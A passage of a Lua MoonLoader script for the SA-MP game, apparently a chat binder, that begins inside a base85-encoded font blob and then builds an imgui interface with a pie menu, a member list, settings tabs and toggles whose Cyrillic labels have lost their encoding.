*u7-u-B5V9QL2163V&P1`RBE;FQ'Fp?d)uX)-c:W]C%RS,lLShL+*Yk[s$3=Y)4%[*G4o=]:/k8C-8dk?.Mv:=m'.d.`Ai/ZJ(,6)Nt>L#(1wG`O'e5D3$Qk,]%1>#C+j[ns$b&G&uD.Lb*T@M$5Q-%]/BZ2KOZ91q1)h$**O0CE#*$=L)p@_P%M3),#,JpP8:$dG*2I?v$cTfs-0vNrLG'.aNCXlGMYqQm859nw'9P<x'6<qw'kZVF7nP>#Gf]tS&B$_/DwXNDWHZ8p&Rs*HM9'MHMXC?uu%-bX$K?:@-_P:@-:;S>-:sDE-p.m<-<.m<-YU^C-u0m<-'J6L-c.m<-^3iH-2*iH-t[wA-+<S>-DR.U.gW6O$3<S>-ER.U.ae.p$e:S>-FR.U.X[iS$m9S>-GR.U.PG:;$);S>-uujv%EJD)+G]%a+VBS]cFS`D+6OHv$ZP,hLdIQ:v5Y###/'uw'e/DKE5.m<-jGr#8%@'_,$,>>#XB.s-[`f--j[Zi9/:7.2iFD>#cRaR6k64e)&gRVClLXd&T>[L(R',)#o+(-2PXUJ,`;mQ#@RkX]-jw$?d9mg)2@2s-[bs:8[ZW/2/r%@'/u>c4'lms$YATM)#7EA-NIwS%q?I=-e#hY$$w00*@Iw8%R#G^,7rqV$qQ8/1`@)v#fc)o&-Duu#6Ip`*/:pPA8*f02F$TlJZ)+,28cKI)9d0R'V<^I]7;81(_3Og%;GAt[&X5$c&%J12L5(F+Hxx^H_AMG)+5Q/)PML/)7YQ/)4ieQ/Uek<89oH>#F@#W.fqOo&Jmo0#nsX@#Y4i>7FAox6G_LbZY_D8([T1FZ#g]+4P2DB#o;5%&bf6<.j/O^%5aI.3a^D.3sn+D#t-J@#XhW4:gQK$7^.gi+<h/98TVb@.l`Ef2&C?L2W4$_+Q35/(?8$@-(`d#-^w73)$^dR&c')A5oit*G#*1u$+A]s9=IRs$eMEm1mVX.3325[5LTOv6xVua.&si8&D+x21^s/*+7_Ua-w6id*>(p*-0cKB+1*t6/-qqC4nbP_+F5>##2x3]#/r.-##Vs)#aYH+8>Hm%-^SQY[Zn*T+4'LW8$R794L)`#$fXs'kCD`D+?]ft[_t4$c/E>2(1LA7:U5G7cr9w<(TLJ=.Hr+@5Kg]>.1pis[cBuaawKxB$i^0-%uSsEQkSH3'5q1i2oqF%p#cHX7+kI>#nmQZ.CIqf)Ue[F%gm/2)Mhh844rs-]$_@j2x#`O'*9..MoeXI)?p:)&Na0S2UQZ)4Y77]6P[NT/'KCW-N/<=(5gE.3@-0W-2*rk+mC`;ZKp?d)1gvx4PrG>#WK'Q&YrdX7Rf7C#p7U&,24NNMpapq%#KX',D`w.2SGA#,(qPQW1c5tnj1R]6h[]n9;Q>O0%c4$%I[<T%ub:@,Z4q/3&g^x,&7Mx,4@ZNL/<]<&ko=xYotPv,H&@h(L1V;$vj==$NZNs%;Gh/=4Rf[ulD^d)GiXI3E&U*+utnW$8P>>#n[Cuu(QqV?>k$29>i+^,Z-bT%Lex*&1d?$$pGpZ-oro71/%c.)UQj-$nPo71apQL2V1h8.+$Ch$n^+;H&l1I3wR;?#3Y7%-dCXI)g,Te$Paf'/tTJG;@Ql3'_?oT(:DYYue]Gb%p&M0(n@^8NTVO@trtxq)bR@[uK6;kBd/#Z-JMGU;km]9(8PUV$+cbCsvn[>>htLS.VV1A=XJ:`a/:7.2]r.9/W>(a4K)]?(h023((cd99BNataB&5/(H36kLGB]/7uYV+9e8o5^(>&<.m4CkLRZ$128LEs/g,5)%6TY&#o'T3K.G)s[1lj2itLQj)Kv+22:Kxh=xFv(5*;ns.06P<-U1ei0CACS@U[jV]iTjjE'%w58^.R<&bB6H3^Pic)-LUa'[a6/tsb9b*b26t-]e8r82+A<AlF]S@=B37M^G_^#c6Mv5+F#^GkDXA/tD9j<^H@C+']]i1m6H6'at<5&HTb8.JA^X@#2)49uLPg1/:=2$fDr2';3<v6j-W-4+Oh1(H=xW.=V2rK?bR9.vmjU.qCsT/v)S3<(-1q8CVr)+ko5p8a=r*%_vX+`7r4jBSwtG2o*2,#:*-f)#L.94a.f$$=o(9.XCUO;=R+Q/cRaR6s?9R1,Q;s[[95'kNb[s-]2(O9r2fp]H9712;sx6cH*Sr%9[x>7RNgJ1R>9F*X11l;;(Uh(6^1H8#[X&#<6S^-N^=g7*^mu[gG1I$p1ljLCFcL<q_#?2*b0bI?xtk;BS?j93RsS]k1R=7`q-N1#V_0M^8ZQ#hh7##TQa[]rfM]$6W:r.JU;8.-S@k*9f*F36=rH'PP230vY$E3N]d8/BP]HF=&Qt$dgxv&BasL)m'o8/(P<p%84cWS?Ve0`?uw+*xk'tS'7.BtAX]vLb`jE*XZf;.9x[W$6nddb``Vs%8NMdC90;F*haf%#r*^*#;]'b$AG.%#Z[P+#GY$0##$[R9qtbq]scUv-SM0@6*RX223.c9Cpt0@'LQ_vKd)07*>xb2(n&NlLX'-Q>>n5'kg^U$KMiH4(U3B.]?w5$cKrt#7oSH.]N6%=(:fSq)oC[sEO%k#A$%6ua=d1%5Lr+@5jCU(@X[j>JA=Y@5QQs#KhOgk0s&sL2QBv5>HO@o1&E`S]?R;9TEUhI=`=;W-9'cBSQV@rLfb8tB%&6v?*&rP/944@6LPYsBZ5R8]w4(tLV&QQ#r^7j%bF`?##.(b*SAnN0>j'O9TR7$7A)vP9+-sS]+B#hFcSwS]8;N>AU1%T.sN9##YmVY$`2fe30tm84;fiu-X,(.;0-*Z6j4q#el[Zx6PtZN9jtg&?s-?i(FA:D5R]h'/HKS&,;d,8/>X$0)?$l.*d.on&ZcG1MhBw-$v-F;.tYRH)JO_C4TvbZ@e;]<&<K_c/[q=/(Y'Sw#l-]n9FT1^#-M`(0I/5##_?+)6S_d##ds0W$*Xb,2xq(QAa&JS:5BOr$)LO,2dIL`$hh_;6;9b>>[hw[b=&'##%0%`$v$u6%Uh1$#bxYV[r4oa-=TxQ%,&w>-%S(s$mY;tE`'1#?s>MN0v9]1$ct39#Y9NEEZjE,W8'/FEgj*#dS^sk<XCH>#sbpC-7bpC-x`iLE;bbA#b,nK1sMYx6jspGdQ`6qR>C,x8eAq6&jcJ*3N*'6&22G>#ADo1$(o*9#eQsEEMOiX0T]$2T;=am/>F9j0gFsX.#ZCX$_FdO,AF=q.H09q%*N*XCL2j]XEn1XCvNkl&&-uh19-BZ-&v%o)vq`U8k+*-E//MB#,rY/$wrimLF`c&#qb>w(X(sT.LG>R&4v(d%g9cZ-nIWIP9#Y#-apVIP+VQ>#/Ix1$_+_-%)t.lBD)^[oAuCE8/uk/ioX./Ub:jf(v4HW-9.`el4.w,E`6)H*U6iB8Oc[a+$L>Z()vvAQtcB'F>@+q&`8VY5&(Vuu;Ko58nT)9/ECI>#[e>A'Jv6r.JE-#Y0^(EP[aL=8YH`^#kYI>Y<+p7Daiw*3]Oa#G8Jw.iB(g8/?'kX$l:[tFB)8_#9hIE)BmNt&>L<mFs=l]>@N(a+?3KK)ZX($)g??oDG]7C#ffdrH)9$Q/A)9U'5e^Lpt)Qk0O?53'1G8MBKjZoeq4:=/MUC6&wt&FF_s;h)S,'b*3+pJ/kSKn8;w0'#@.$c$F7V*MFwl&#Q=)9+1Kt-;,8L+?`?o8%t#ht-AqNDF^pMw$lC9f)E'GfE%NHFF%%jd*rg>C-wvPCFZ9_^#],I>Y+abE5:;EJ8Cv1'#1%7W$4qwc9UFnr[Uoc;-FO(P+9Yci9#G:p&W/H?-H]ma.LHI`$&]Ye8JUsPK.wf#G@&;Dbuw2<-Mh'_%9]V6/oBl^$7'4d9lnP2(tt;W-KWNo;%WZr/SCsl&sgI;In#W+d_dQL2q?jU+DjR]8_9Hl.@hVc':F,$%[YS]8l&GT%W,rK(#)>>#X[iS$f.hw/qXI%#9R@%#Z$`5/7Gta$pZg58ARSfrvHKW.Z7]1$LMO]/mueLpJBfK:ZIY.uaCH>#`cpC-aKO]/cN0e+-PMwGKD:B#xM4M$kO`o2,%32=&8<J%c6468P[1Al&HGDXbQB?-K$&C'VE+L:c%uxuFU:)Hrt49#'S:)H7W@;#&8P>#9Ix1$=.e18`6dDlqd'^#FeGS7f1kA+U1q7Rsx&9'*bBZ7MnGn0qFaT/[M0@6J>Ap]'_ucHHJi.2LMPKGr*$[A#%`o:.tx6c4]Yca08Xm^2;xh(eOHP/U[(V]GsGl(4.1qe&b4,<'ucxO&'.*IuOun:_+9W.*A9b*0?Qg1ELGI)(#:Q(??G>#MBrqL3QH##LN_%.Qo[f2hV[]4JjE.3(fK+*ig'u$h;,+%@<aw$?]d8/(ISs$L1]A4YSYS.>U^:/IM>8.</^F*4gY,*.mb_/vZv)4QYGc4L_uS/_OlDNFB#J*sn@g)cjWL#F'r-Mtx*f2X,qG*l5/]%Be,;dNVKq%5@h97Wa10(XJc31p>v6&8m/Q(QHGN';;e,F1%kT%C#Z^=_u@oLiA_m&#uk.)I=SCui.,+.grBt%=*qn0,eIj<NR'L5wnEW-1leA@#--3'R#Dk'0PaWB4#Ek'J'9q%7U2%,@<>=$d2TtCYxWk'T/%L(>&SU;k_WNM_rugLpF)[%I4xT/:[OmJZh)v#/f_;$&l-G>/#a;$+GY>#13GB&clh;$P*/%u^Yj-HfS7[Z2-<O;GLAj<U006&YnD2MD1CE#:9D:%1'E[9xH:g(7WY&J[nkt$.M(v#p16s$Vl&F*Z3n0#v(+GM3?_Lp.Z^b%k$EVn21C#$=5$ENmWt&#qd0'#upB'##'U'#'3h'#+?$(#/K6(#3WH(#7dZ(#;pm(#?&*)#C2<)#G>N)#eJf5#o*]-#LL7%#PXI%#Te[%#Xqn%#R@%%#ZNc##Nd`4#v5i$#Ygh7#3*V$#MnF6#8d46#B=G##>GX&#q&/5#7PC7#I<r$#;Ux5#7h1$#nCW)#mYu##,5n0#HtC$#2AP##LGY##`#M$#Q;F&#9cjL#@mq7#9]%-#w,d3#UF^2#=Ul##)La)#9TK:#9#'2#?;':#6OB:#2hg:#8np:#4mj1#5SE1#545##X^V4#hji4#d?O&#MRp2#Z@T2#Wk>3#RWs)#p]&*#vn@-#Z9v3#O6I8#C+78#5%S-#S1f-#c1@8#jIe8#lOn8#F<x-#stN9#OE]5#a#X9#%+b9#tMm;#Uk8*#YuJ*#^+^*#b7p*#fC,+#jO>+#n[P+#rhc+#vtu+#$+2,#(7D,#,CV,#0Oi,#s'a<#`5s<#_;&=#fG8=#u+$<-;.:;-+gx>-svsj0:aJQCjE]E$kwViF8rNh#tre+MrqJfL_>DG)H*m<-?VjfL.WCbaQu.I`8M5-NLVRL'#A7GV?crxL`W^l#ew^R'n_3T%P#O`#^9=G2jLfj0/Gc>#55R>#JR-P2ZIaEOoM[+W3O&&#gF3/1*tI-#[mk.#J0f-#>?pV-:=3L#xqDAPZ2N@$;=OOQBd+nPQN4uX[*@g-<U&=(j-Ph#m#5L#7Q[w#84eIjOStR6)vrxLqp'I2,.Ei-7>0hPS`^O(l:Vv#A[h,)W[dFH$QxUCfJfI2WGRb3OfrZ>c:ah=9,i:1_m?uB;HeL2htIu-HuPHN:gp?-[4H1Fs2+nDepr`=:IBDI'U%F-cPtjE#0AUCmIjS8u9RG*%s*M2FjEM2$v>v?+s_$';v]b4LVlC5rKsP2+Z`MLN9vn%gEP##5Q+2#aK=i#?97]bnTvK=d=R(Z7M3k*FprFc)O$n:#_ETinA8DLrRs-'?K`deje49]/in(RfPKKXq'pY$Gm-%#qYj6hhdD)a:aL<_#Gj_,sHC,'2p>Sau#L-=^.rDCYJ_HK?Sefla6<4i7*^I`2arVLS^f'rOMXYW?3I/876W2:-nB]#(/>>#)`d<-H.ad%uC9h[/Y>7WDN$_I6o`[Hx[9G/x^RQ2%[Ah3=4Go:bk[guJo(WhbV;`Copt22M.Q?J.0)t)h(68JO*NpP4ii857PPmH=+[.cc<>J*miFPcFQ*p-5BBLRbgDY@k,Z25Zf.<>eKo)hGaiT$xhdfLeNns[T6$+fgCE@6j,Ph#JSUA4vM3.)ihCWO6l8x`IvTNPafhud?'klO[;&W$tS1tUlSCC,kXd;-J1SV%6INcH$[?,<9=/jFDUNa>Bq668-Z[21:h1L51I3:.6FqiDjZr`=,&D.G-U7F-p0k(Iv'%F-t*oFH@Q*.3>L7p0-.^J;9a@Q:gvB`?a/QW8R+#;91)3p/v>Yc4Mn$F'`9RG*&#4M2AB[L2cpo0#.nB['9g3.3r_f['^3=F84$BjK6Bv1qb;+O1K>Lr[9;Ec&Pe.w>JZDnH.5rR0Uo44&;c83osrom&E7]u?4`2Asgc'qa94uJKjt)5ECGko)7Ar1sY8H>A>j@f1qNPSLfk?`RMHD5244iX$-f(hRp^on:Y77#.?8Q^K)C>4Nc]dWSul#S4,BFK1+nToTAp?U%bNP##)_i0#;c(tM#db/oF30Wh=[&,JcjE4SIE]AY8&J:P$4[huh$euPEis&eQkPTrfSSk^P7LTED@Qac&q6=4S.GDkM+2)NUY1'&$bRR8pM#f;+dTxTLwGcupvQ,e0l.S$-eE6Ki;Yhn8`'3YKSQ?8WA_,.D>C)Okg>_%a&7WtPLYoelb*G4Mf:c`Bw^h8uB-i9Tg*+eRs5)/tO<?855f>Z&`st.Sfc;-Bd:F,=1@W-3mY#[o1Vk3Y;$P9C,tJ2Zl.QLsS^M#WoIJLa*9OLZopWLt&#<pND&JQ7ds-^.*EkjJ_GEQL)UJf.Pl]9iEFYR'Zi874?XeIb_%=u)R.7_hXCnp*hW]1n`4wFTS;'=c=lI<kX7M<pWi98f)1TPF^;i^D@/MSn[uM:aTitgoHVY>3Ik&2rgR-LM]==isW-;PK7ZW`D77ND':&Ku4L(v#]I`<-FxMd%q:?gt*-%uDA)s/GG.@^,3GJ@[B-7PH[Y(nqn[]DZXW8Y%_B0Pk9Z(dn0=J'm[/Yw%-F[tOqN#,e:]lp.ajOA<1B;Cg#GN95_dxrev=[P1:fG)UMlQp9FrAu9qgo[2%IABf54SSK(kD^0:OwBtwre>kT2px73@m31]dHb%?]q]4;+%Z#8q=/(Y(Zqr`pt-i&wrFiE8xb30c--kpBEM2W3)-k]dHL2[*Go9WJ*jL,fvTBt.SR9$unMrY@D^6cOFs10g^oD+^,LF<rY1FE(Q-G9i7FHXUt82'k1B-X]#hFTX0@-r8WD=IQw31<3$<86l]u8gIUB5P5tM2dS1e4nd)7D$HkjEFgLB-Ro(*H`/[@-'a`kD/>$E%9u8H2[5'oDrfpoDB^*vHmVMH2m?Ps/>j>>>@2AI2ITYH2JViv>uSXnD2YiiFXv%I2Bj8c$cduRC(DvLF]uOJ2KI`t-.as'Oh[WmLu-5fGOp>.-Y;p/-$8SV%,OtlBskK/P#x&;TtL62*A<#c<>er*qJkII_2<XnFa4V9&.)g#gl8PUkharNHY=&$N7*4cs(5wa&Nh<6tf_.Z@8'7e7s<:j*QUBxGL7`Rp3k%Z$c[88>SikH&h2TUda*a'pcCkle%51C7r6$^G<^c^i<IUapcHFRIgL(v#icw]FF=`DEpgpdm)h==$0g>G2:_330=cCv#PTCX2up2@'9#SJL@BK3Oq2vASqxqDuPOl<57dNlqaLh$CfJ]E-)7WN((7N'ST>G>#oodI2PfiH2*DjF&f4vY#0XAG2Ndk;.hZtG2DAtv$p>1I$'ex>-c@*#.OF3jL%a@JV]>CKDE7]+HSx):8aJxV8@-]wL8G<tLB@4PD.l%mB.DqoDc$Q<B1xsfDK=JN)<DK*H?G0H-rN.UCxm@uB6-B5B*usfDKdeYH#A;B5IT:GH,&VEH14gvGv^RUC:^I>HS.G>HKR8R(ZPgS8ELGhDrZvc<$dUEHv'%F-+@*UD4]pKFcdbjLX5T9&:%wqeKVaJ2QdavHgZM=B,G1[B7&Zr;JpKT.Sgqf5#0%T-e'50.0+,rL3eF?-PiK<0D1mHG;%=GHwfWv[XkNA-<QSgLRCVN:-j4K1,<8+4H2hS81o<GHaAjVC@xwf;@7fFH'qwF-kLeBIIeov76gnL2?P3?>bY?_/OW=gG4hUqLR^Z<0Rf>G4GCo/1'vnHFJ<Y>-^meF-xj-W%5&WD=)>2eG<QCq1ttPH=Pc^0<nB-H=Yb.+>%a*D-GS8Y8GYBk;dS1s7x9n?I@PER:Slx:9#7m,MmrWR:i$GA-%kUB-16VB-Ec*C&fIwOM(w-U9Eoc)>oi@['OT/J=PC6P;E%wF>8WdW8;J1M<;WD69qWQH=PYJq9akv*4*aRC-JW?W8IZ299,fax7O58:9TKtZ^v_'N:LcRoLtZ0s7eIqK<mvB`?4LvtMT3I./*Odh<H'F_]80si<b-Af=u'6h/]S]0<Lrfu85C@r)2u6w^,=QH=,9XNtNjp5/+VeP9=D.4MJnsmLN;Gt7'.-H=Y@;E>#NwC-l<<i<7MG61m%&u80=(O;-&PL<_@'99pcQw7mvUB-@NHT8Yuo:9_/mT`s74N;(vmX.X::S:u86u7.ua>-NRI'2qkxv7>ZV99n_p`=:tQgLfVgS89DL_8542*>MeVe=S1HQ80jXVCDZOG-r%FdO79MnD8A2eG&LPDF2vkVC$*FnD.P9Y8H2Gt7=>_oD*)YVC)7'_I2e`$H5-xF-2MnbH/=ISD59%rLj*VG-o@%mB32hoDxXcW/$YD5B'onfGhlCp..Sv1F[si34Z1f34?T1qL4`oE-Z=:XLX(Ym121Z4LY]A`*>S:68jjXfEBDRr15&7R2cHG>>wBF,21Rln0`rOb/C$>[99B%126;DEH#+lsf+w$kEGFto2>%ZlEsA[dFt`1>$c6w>#SHWh#1%'U%erpWL>?I-T7u;*us;uDgjN9Sejd1FsdrA*;w7f,5<<[f9iNp=8XYd:#CGwj3jlvFcsL6^`qe3LWYSS5U>3H1=7L4(V`X@lNHBQ;Y2u?Nq[<E%q-3ZQN9`u#U-+W/[1B%+,s.F,,A8X3^9sx@=g+4-pT/sLSWXX<s_r@GJ29l-$u6l-$j9G>#4*csfP@Qi(+GiT.rF)Y2IAQT%-btc2u8,t-`Sbr7]m%T&OdCi'sF$)OrD)d2ke6X-5NT#W,qLSV&]Nq,nAbX2qG1a5x(bM29CU0L/nl+#R0f-#J$S-#EamnV/wWs7TEg;IX&a*FPYe,2<rY1F[Q]/G#$/>B@Z0H-Ow'U%_lT<LBe1^1*f*@tq4,>Kc=_b;Y>DgpCe*BMGpND9-<HInx0b&frf[WiRYR%/[4r1^.XT&DN0W13;E`M$5vVqPDD_CHx-k,X1_reKH]KBicc_-@5Yd67e*:1DpR53dmZU/oiE143fU:e)@7faB-la`HSa7f.h6sCgqcqq&ocLlfN=5Se@VHT.3&5L#Fs*7/6:G>#2vnW<jSP:'U'_5'<+ie*`c]#$I;@%')FFG2[v:*3r6$o'eP9D5JD,(5H#ke3);]>8cW7F4w+hti)X_;(Oo6<C)xDs7:[AjKl80.M$_B%)qd$NmFc[oJklk)CR#d:<AOjFGqx@$n4:XvDB)1HJRR0P9om?oE[>KInu[hhK*93&pX9^7Lwt_chtDo#e2j;P[U1V7M,F%Io2=jT40Z`f,B=GIlOrcB`+TR[pF0skGN`Sr3.+t'Xn2_-<TNv:r2.Yqn:4u%jps&##"
		imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(result_compressed_data_base85, 24, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 

		-- ����� ������� ��������� ����� ��� ������ ���������:
	        imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 14.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	        imgui.RebuildFonts()
	 
end
apply_custom_styles()

function imgui.OnDrawFrame()
	-- ############################ Pie Menu
			if piearr.pie_mode.v then
					imgui.OpenPopup('PieMenu')
					if pie.BeginPiePopup('PieMenu', piearr.pie_keyid) then
							for k, v in ipairs(piearr.pie_elements) do
									if v.next == nil then if pie.PieMenuItem(u8(v.name)) then v.action() end
									elseif type(v.next) == 'table' then drawPieSub(v) end
							end
							pie.EndPiePopup()
					end
			end
			
			-- if piearr.reportpie.pie_mode.v then
					-- imgui.OpenPopup('PieMenu')
					-- if pie.BeginPiePopup('PieMenu', piearr.reportpie.pie_keyid) then
							-- for k, v in ipairs(piearr.reportpie.pie_elements[piearr.reportpie.mode]) do
									-- if v.next == nil then if pie.PieMenuItem(u8(v.name)) then v.action() end
									-- elseif type(v.next) == 'table' then drawPieSub(v) end
							-- end
							-- pie.EndPiePopup()
					-- end
			-- end

		if show.show_mem1.v then
			imgui.SwitchContext()
			colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
			imgui.PushFont(imfonts.memfont)
			local sw, sh = getScreenResolution()
			imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
			imgui.SetNextWindowSize(imgui.ImVec2(650, 540), imgui.Cond.Always)
			imgui.Begin(u8("������ ������"), show.show_mem1, 2 + 32)
				imgui.Columns(5, 1, true)
				imgui.TextColoredRGB("{FFFAFA}#")
				for k, v in ipairs(mem1[1]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}ID")
				for k, v in ipairs(mem1[2]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}���")
				for k, v in ipairs(mem1[3]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") if imgui.IsItemClicked() then show.show_mem1.v = false sampSetChatInputEnabled(true) sampSetChatInputText("/t " .. mem1[2][k] .. " ") end end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}����")
				for k, v in ipairs(mem1[4]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}���")
				for k, v in ipairs(mem1[5]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.SetColumnWidth(0, 40)
				imgui.SetColumnWidth(1, 40)
				imgui.SetColumnWidth(2, 200)
				imgui.SetColumnWidth(3, 150)
				imgui.LockPlayer = true
				imgui.ShowCursor = true
			imgui.End()
			imgui.PopFont()
		end

		if guis.mainw.v then -- �������� ����
				imgui.SwitchContext()
				colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
				imgui.PushFont(imfonts.mainfont)
				imgui.LockPlayer = true
				sampSetChatDisplayMode(0)
				local sw, sh = getScreenResolution()
				imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
				imgui.SetNextWindowSize(imgui.ImVec2(1200, 730), imgui.Cond.Always)
				imgui.Begin("Binder for CO by Belka version " .. tostring(V) .. "", guis.mainw, 4 + 2 + 32)
				imgui.Text(u8("��� ����������� � �������� ����� c������� � ����� �����. ���� ���� ������� ������� �� ������ \"������\", ����� ��������� ������������ ������� �� ������ \"���������\". �������� ����!"))
				local ww = imgui.GetWindowWidth()
				local wh = imgui.GetWindowHeight()
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 320))
						if imgui.Button(u8("���������"), imgui.ImVec2(120.0, 20.0)) then guis.mainw.v = false imgui.ShowCursor = false imgui.LockPlayer = false sampSetChatDisplayMode(3) sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ����������...", 0xFFFF0000) needtosave = true end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 290))
						if imgui.Button(u8("����� ����������"), imgui.ImVec2(120.0, 20.0)) then imgui.ShowCursor, imgui.LockPlayer = false, false sampSetChatDisplayMode(3) sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ����� ��������...", 0xFFFF0000) needtoreset = true guis.mainw.v = false end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 260))
						if imgui.Button(u8("�������� / ������"), imgui.ImVec2(120.0, 20.0)) then guis.updatestatus.status.v = true end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 510, wh/2 - 320))
						if imgui.Button(u8("�������� �����"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = true, false, false, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 380, wh/2 - 320))
						if imgui.Button(u8("���������������� ������"), imgui.ImVec2(160.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, true, false, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 210, wh/2 - 320))
						if imgui.Button(u8("�������������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, false, true, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 80, wh/2 - 320))
						if imgui.Button(u8("�������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, false, false, true, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 50, wh/2 - 320))
						if imgui.Button(u8("Overlay"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, false, false, false, true, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 180, wh/2 - 320))
						if imgui.Button(u8("������� ��������"), imgui.ImVec2(160.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, false, false, false, false, false, false, false, false, false, false, false, true	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 350, wh/2 - 320))
						if imgui.Button(u8("���������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v = false, false, false, false, false, true, false, false, false, false, false, false, false	end

				if maintabs.tab_skipd.status.v then
					if imgui.ToggleButton("tab_skipd1", togglebools.tab_skipd[1]) then config_ini.bools[45] = togglebools.tab_skipd[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ � �������"))
					if imgui.ToggleButton("tab_skipd2", togglebools.tab_skipd[2]) then config_ini.bools[46] = togglebools.tab_skipd[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������������� �� ���������� ������ �� �� �������"))
					if imgui.ToggleButton("tab_skipd3", togglebools.tab_skipd[3]) then config_ini.bools[47] = togglebools.tab_skipd[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ �������� �� ������/���������� �������� ���"))
					if imgui.ToggleButton("tab_skipd4", togglebools.tab_skipd[4]) then config_ini.bools[48] = togglebools.tab_skipd[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� �������� ������ ����� � /carm (���������� ��������� �������� /mon)"))
					if imgui.ToggleButton("tab_skipd5", togglebools.tab_skipd[5]) then config_ini.bools[49] = togglebools.tab_skipd[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����������� �� ������������ ������ ������������� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial1', guibuffers.dial.med) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8(" ����.)"))
					if imgui.ToggleButton("tab_skipd6", togglebools.tab_skipd[6]) then config_ini.bools[50] = togglebools.tab_skipd[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ����������� ������ �������� ���. ���������� � ����� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial2', guibuffers.dial.rem) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8(" ����.)"))
